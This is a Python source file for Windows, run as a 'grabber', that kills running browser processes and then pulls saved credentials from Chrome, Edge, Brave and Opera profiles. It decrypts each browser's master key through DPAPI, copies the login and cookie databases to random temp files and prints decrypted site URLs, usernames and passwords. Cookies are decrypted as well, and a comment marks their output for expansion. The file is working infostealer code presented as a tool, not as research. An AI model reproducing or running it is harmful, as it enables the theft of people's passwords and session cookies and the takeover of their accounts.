import os
import json
import base64
import sqlite3
import psutil
import time
import random
import string
from pathlib import Path
from shutil import copy2

try:
    from Crypto.Cipher import AES
except ImportError:
    from Cryptodome.Cipher import AES

from win32crypt import CryptUnprotectData

class Browsers:
    def __init__(self):
        self.appdata = Path(os.getenv('LOCALAPPDATA', ''))
        self.roaming = Path(os.getenv('APPDATA', ''))
        self.browser_exe = ["chrome.exe", "brave.exe", "msedge.exe", "opera.exe", "chromium.exe"]
        
        self.browser_paths = {
            'google-chrome': self.appdata / 'Google/Chrome/User Data',
            'microsoft-edge': self.appdata / 'Microsoft/Edge/User Data',
            'brave': self.appdata / 'BraveSoftware/Brave-Browser/User Data',
            'opera': self.roaming / 'Opera Software/Opera Stable',
            'opera-gx': self.roaming / 'Opera Software/Opera GX Stable',
        }
        self.profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3']
        self.kill_browsers()

    def kill_browsers(self):
        """Kills browser processes to unlock the SQLite database files."""
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in self.browser_exe:
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        time.sleep(2)

    def get_master_key(self, path: Path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception as e:
            return None

    def decrypt_payload(self, cipher_text, master_key):
        """Decrypts AES-GCM encrypted data."""
        try:
            iv = cipher_text[3:15]
            payload = cipher_text[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            return decrypted_pass[:-16].decode()
        except Exception:
            return "Decryption Failed"

    def process_data(self):
        """Main runner to extract cookies and passwords."""
        for name, path in self.browser_paths.items():
            if not path.exists(): continue
            
            master_key = self.get_master_key(path / 'Local State')
            if not master_key: continue

            for profile in self.profiles:
                # Process Passwords
                self.extract_passwords(name, path / profile / "Login Data", master_key)
                # Process Cookies
                self.extract_cookies(name, path / profile / "Network" / "Cookies", master_key)

    def extract_passwords(self, browser_name, db_path, master_key):
        if not db_path.exists(): return
        
        temp_db = create_temp()
        copy2(db_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for url, user, pwd in cursor.fetchall():
                if user:
                    decrypted_pwd = self.decrypt_payload(pwd, master_key)
                    print(f"[{browser_name}] URL: {url} | User: {user} | Pass: {decrypted_pwd}")
        except Exception as e:
            print(f"Error reading passwords: {e}")
        finally:
            conn.close()
            os.remove(temp_db)

    def extract_cookies(self, browser_name, db_path, master_key):
        if not db_path.exists(): return
        
        temp_db = create_temp()
        copy2(db_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for host, name, value in cursor.fetchall():
                decrypted_cookie = self.decrypt_payload(value, master_key)
                print(f"[{browser_name}] Host: {host} | Name: {name}") #simple log might remove or expand on !!!!
        except Exception as e:
            print(f"Error reading cookies: {e}")
        finally:
            conn.close()
            os.remove(temp_db)

def create_temp() -> Path:
    """Creates a randomly named temp file."""
    base_dir = Path(os.getenv('TEMP'))
    chars = string.ascii_letters + string.digits
    file_name = ''.join(random.choices(chars, k=15))
    path = base_dir / file_name
    return path

#execute
if __name__ == "__main__":
    grabber = Browsers()
    grabber.process_data()
    print("\n--- Finished ---")